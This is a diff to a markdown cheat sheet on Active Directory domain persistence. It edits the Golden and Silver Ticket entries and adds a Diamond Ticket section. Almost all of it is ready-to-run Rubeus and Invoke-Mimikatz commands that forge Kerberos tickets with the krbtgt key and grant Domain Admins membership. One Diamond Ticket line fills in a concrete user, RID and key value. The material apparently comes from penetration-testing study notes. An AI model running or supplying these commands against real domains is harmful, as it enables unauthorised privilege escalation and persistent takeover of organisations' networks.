@@ -1,6 +1,7 @@
 # Domain persistence
 * [Golden Ticket](#Golden-Ticket) 
 * [Silver Ticket](#Silver-Ticket)
+* [Diamond ticket](#Diamond-Ticket)
 * [Skeleton Key](#Skeleton-Key)
 * [DSRM](#DSRM)
 * [Custom SSP - Track logons](#Custom-SSP---Track-logons)
@@ -33,11 +34,11 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 - Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
 - To get the SID use ```Get-DomainSID``` from powerview
 ```
-.\Rubeus.exe golden /aes256:<KRBTGT AES KEY> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /nowrap
+.\Rubeus.exe golden /aes256:<KRBTGT AES KEY> /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN SID> /nowrap
 ```
 
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:<USER> /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 ```
@@ -62,11 +63,7 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <COMPUTERNAME>
 - Use the hash of the local computer
 - Other services are HOST, RPCSS, WSMAN
 ```
-.\Rubeus.exe silver /service:<CIFS>/<FQDN> /aes256:<AES> /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN SID> /nowrap
-```
-
-```
-
+.\Rubeus.exe silver /service:<CIFS>/<FQDN> /aes256:<AES OF SYSTEM> /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN SID> /nowrap
 ```
 
 #### Check access 
@@ -97,6 +94,15 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN>
 #### Check WMI Permission
 ```
 Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
+```
+
+## Diamond Ticket
+- Is made by modifying the fields of a legitimate TGT that was issued by a DC.
+- Cannot be generated offline since it will connect to the DC
+
+```
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:<USER> /ticketuserid:<RID OF USER> /groups:512 /krbkey:<KRBTGT AES KEY> /nowrap
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:0xjs /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d /nowrap
 ```
 
 ## Skeleton key
